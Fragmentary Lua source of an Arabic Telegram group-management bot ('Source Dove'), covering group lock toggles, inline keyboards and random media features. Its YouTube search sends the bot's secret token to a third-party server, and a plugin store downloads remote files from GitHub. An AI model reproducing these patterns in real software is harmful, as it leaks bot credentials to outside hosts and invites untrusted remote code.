DevRio:set(Dove..'Rio:Lock:Id:Photo'..data.chat_id_,true)
...
DevRio:del(Dove..'Rio:Lock:Id:Photo'..data.chat_id_)
...
DevRio:set(Dove..'Rio:Lock:Id'..data.chat_id_,true)
...
DevRio:del(Dove..'Rio:Lock:Id'..data.chat_id_)
...
DevRio:set(Dove.."Rio:Lock:GpLinks"..data.chat_id_,"ok")
...
DevRio:del(Dove.."Rio:Lock:GpLinks"..data.chat_id_)
...
DevRio:set(Dove.."Rio:Lock:GpLinksinline"..data.chat_id_,"ok")
...
DevRio:del(Dove.."Rio:Lock:GpLinksinline"..data.chat_id_)
...
DevRio:del(Dove.."Rio:Lock:Welcome"..data.chat_id_)
...
DevRio:set(Dove.."Rio:Lock:Welcome"..data.chat_id_,true)
...
DevRio:set(Dove..'Rio:Lock:AllRed'..data.chat_id_,true)
...
DevRio:del(Dove..'Rio:Lock:AllRed'..data.chat_id_)
...
DevRio:set(Dove..'Rio:Lock:GpRed'..data.chat_id_,true)
...
DevRio:del(Dove..'Rio:Lock:GpRed'..data.chat_id_)
...
DevRio:set(Dove.."Rio:Del:Me"..data.chat_id_, true)
Text = "*⌔︰تم تعطيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Dove.."Rio:Del:Me"..data.chat_id_)
Text = "*⌔︰تم تفعيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:set(Dove.."Rio:Kick:Me"..data.chat_id_, true)
...
DevRio:del(Dove.."Rio:Kick:Me"..data.chat_id_)
...
DevRio:set(Dove.."Rio:Lock:KickBan"..data.chat_id_,"true")
Text = "*⌔︰تم تعطيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Dove.."Rio:Lock:KickBan"..data.chat_id_)
Text = "*⌔︰تم تفعيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:set(Dove.."Rio:Lock:ProSet"..data.chat_id_,"true")
Text = "*⌔︰تم تعطيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Dove.."Rio:Lock:ProSet"..data.chat_id_)
Text = "*⌔︰تم تفعيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:set(Dove..'Rio:Lock:Games'..data.chat_id_,true)  
...
DevRio:del(Dove..'Rio:Lock:Games'..data.chat_id_) 
...
local Sudo_Welcome = '⌔︰اهلا بك مجددا عزيزي \n⌔︰اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس داف فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ⌔','↫ اغنيه ⌔'},
{'↫ ميمز ⌔','↫ ريمكس ⌔'},
{'↫ صوره ⌔','↫ متحركه ⌔'},
...
tdcli_function({ID="GetUser",user_id_=Dove},function(arg,dpbot)
local inline = {
{{text="⌔ المطور .",url="t.me/"..(dp.username_ or "EEPEF")}},
{{text="⌔ السورس .",url="https://t.me/EEPEF"},{text="⌔ لتنصيب بوت .",url="https://t.me/eueeee"}},{{text="⌔ اضفني في مجموعتك .",url="t.me/"..dpbot.username_.."?startgroup=botstart"}}
}
...
if not DevRio:get(Dove..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*⌔︰قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
...
{{text = '⌔ Source Dove .', url="t.me/EEPEF"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
--     Source Dove     --
if text and text:match("^(.*)$") then
local SaveKt = DevRio:get(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SaveKt == 'SaveKt' then
local GetKtTexts = DevRio:get(Dove..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Dove..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "⌔︰⌔︰تم الغاء عملية حفظ اسئلة الكت  ↫ "..GetKtTexts ,  1, "md")
DevRio:del(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Dove..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_)
DevRio:del(Dove..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Dove..'Rio:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Dove..'Rio:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
...
if text and not DevRio:get(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Dove..'Rio:Sudo:Kt'..msg.chat_id_,text) then
local DavidTeam =  DevRio:smembers(Dove..'Rio:Text:KtTexts'..text..msg.chat_id_)
...
local Tsl = DevRio:get(Dove..'Rio:Tsl')
local Text = [[
...
--     Source Dove     --
if text == "الرابط" then
local Link = DevRio:get(Dove..'Rio:Link')
local Text = [[
...
if not DevRio:get(Dove..'Rio:Lock:Games'..msg.chat_id_) then
local Games = DevRio:get(Dove..'Rio:Games')
local Text = [[
...
Text = [[
Welcome To Source
⌔︰[Source Dove](https://t.me/EEPEF)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '⌔ Source Channel',url="https://t.me/EEPEF"}},{{text = '⌔ Developer',url="t.me/eueeee"},{text = '⌔ Tws Dove',url="https://t.me/L3LSBot"}},{{text= '⌔ Exp Source',url="https://t.me/EECEF"}}}
local msg_id = msg.id_/2097152/0.5
...
if DevRio:sismember(Dove..'Rio:Owner:'..msg.chat_id_, result.sender_user_id_) then
...
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(Dove..'Rio:Owner:'..msg.chat_id_, result.id_) then
owner = 'المالكين • ' else owner = '' end
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ⌔") and not DevRio:get(Dove..'Rio:gif:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1075); 
local Text ='*⌔︰تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/gif:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ⌔") and not DevRio:get(Dove..'Rio:memz:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1201); 
local Text ='*⌔︰تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/memz:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local Text ='*⌔︰تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/Song:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ⌔" or text == "اغاني") and not DevRio:get(Dove..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1167); 
local Text ='*⌔︰تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/mp3:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ⌔") and not DevRio:get(Dove..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,612); 
local Text ='*⌔︰تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/remix:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ⌔") and not DevRio:get(Dove..'Rio:Photo:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(4,1171); 
local Text ='*⌔︰تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/photo:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ⌔") and not DevRio:get(Dove..'Rio:Anime:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(3,1002); 
local Text ='*⌔︰تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/anime:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ⌔") and not DevRio:get(Dove..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(45,125); 
local Text ='*⌔︰تم اختيار الفلم لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/Movies:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ⌔") and not DevRio:get(Dove..'Rio:Series:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,54); 
local Text ='*⌔︰تم اختيار المسلسل لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ⌔",callback_data="/series:"..msg.sender_user_id_}},{{text = '⌔ Source Dove .',url="t.me/EEPEF"}}} 
local msg_id = msg.id_/2097152/0.5 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove..'Rio:Lock:Gamesinline'..msg.chat_id_,true)  
end
...
Text = "⌔︰تم تفعيل المجموعه "..dp.title_
local inline = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..msg.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..msg.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..msg.sender_user_id_}},{{text="‹ Source Dove ›",url="t.me/EEPEF"}}}
...
Text = "⌔︰تم تعطيل المجموعه "..dp.title_
local inline = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..msg.sender_user_id_}},{{text="‹ Source Dove ›",url="t.me/EEPEF"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
DevRio:srem(Dove.."Rio:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
DevRio:set(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_Rio(msg.chat_id_, msg.id_, 1, "⌔︰حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevRio:get(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "⌔︰تم الغاء الامر" ,  1, "md")
DevRio:del(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Dove..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevRio:set(Dove..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Dove..'Rio:Sudo:Kt'..msg.chat_id_,text)
return false
end end
--     Source Dove     --
...
local Leave = DevRio:get(Dove..'Rio:Leave')
local Text = [[
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Dove.."Rio:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local DoveTeam = '⌔︰اهلا عزيزي ↫ '..RioRank(msg)..' \n⌔︰تم تعطيل اليوتيوب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DoveTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Dove.."Rio:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevRio:get(Dove.."Rio:WhyTube"..msg.chat_id_) and ChCheck(msg) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://ccccxcc.ml/Dove/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source Dove     --
if SecondSudo(msg) then
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/Dove-TeaMLar/DoveFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⌔︰قائمة ملفات متجر سورس داف\n⌔︰الملفات المتوفره حاليا ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/Dove-TeaMLar/DoveFiles/master/DoveFiles/"..FileName)
if Res == 200 then
